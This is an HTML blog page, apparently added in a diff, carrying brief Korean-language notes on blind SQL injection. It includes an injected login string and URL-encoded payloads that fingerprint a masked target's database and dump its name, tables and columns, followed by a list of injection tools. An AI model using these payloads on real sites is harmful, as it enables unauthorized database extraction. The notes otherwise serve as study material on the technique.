@@ -1,0 +1,276 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Blind SQL Injection - My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Blind SQL injection Case UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
+PASS = ""
+QUERY = "select * from users where uname='" +UNAME+ "' &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/blog/2014/06/14/blind-sql-injection/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Blind SQL Injection</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h4>Blind SQL injection</h4>
+
+<p>Case</p>
+
+<pre><code>UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
+PASS = ""
+QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"
+</code></pre>
+
+<p>이런 상황에서 QUERY 는 다음과 같이 eval 된다.</p>
+
+<pre><code>select * from users where uname='' or (ascii(substr(select user(),1,1))&gt;63) --' and pass=''
+</code></pre>
+
+<p><code>uname=''</code> 을 만족하는 row 는 없을테니, <code>or</code> 뒷부분에 따라, 전체 query 의 결과가 달라진다.
+이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다.
+SQL WaitFor 로 Delay 를 삽입할 수도 있다.
+Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.</p>
+
+<p>우선 DB 종류를 확인.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--
+</code></pre>
+
+<p>DB 이름을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--
+</code></pre>
+
+<p>TABLE 을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--
+</code></pre>
+
+<p>TABLE schema 를 덤프.</p>
+
+<pre><code>select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';
+</code></pre>
+
+<p>그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.</p>
+
+<h4>Havij</h4>
+
+<ul>
+<li><a href="http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html">Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+<li><a href="http://www.youtu.be/Fp47G4MQFvA">YouTube: Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+</ul>
+
+
+<h4>BBQSQL</h4>
+
+<ul>
+<li><a href="http://www.youtube.com/watch?v=Dh9Pa0kDfsc">DEFCON 20: Rapid Blind SQL Injection</a></li>
+<li><a href="https://github.com/Neohapsis/bbqsql">bbqsql github repo</a></li>
+</ul>
+
+
+<h4>SQL injection 에 관해 읽을만한 글은</h4>
+
+<ul>
+<li><a href="https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf">libinjection</a></li>
+<li><a href="http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation">New Techniques in SQLi Obfuscation</a></li>
+</ul>
+
+
+<h4>Tools</h4>
+
+<ul>
+<li>bbqsql</li>
+<li>sqlmap</li>
+<li>sqlninja</li>
+<li>BSQL Hacker</li>
+<li>the Mole</li>
+<li>Havij</li>
+</ul>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Your Name</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://yoursite.com/blog/2014/06/14/blind-sql-injection/" data-via="" data-counturl="http://yoursite.com/blog/2014/06/14/blind-sql-injection/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/06/02/dissecting-the-android-bouncer/" title="Previous Post: Dissecting The Android Bouncer">&laquo; Dissecting The Android Bouncer</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/06/18/a-bug-hunters-diary/" title="Next Post: A Bug Hunter's Diary">A Bug Hunter's Diary &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
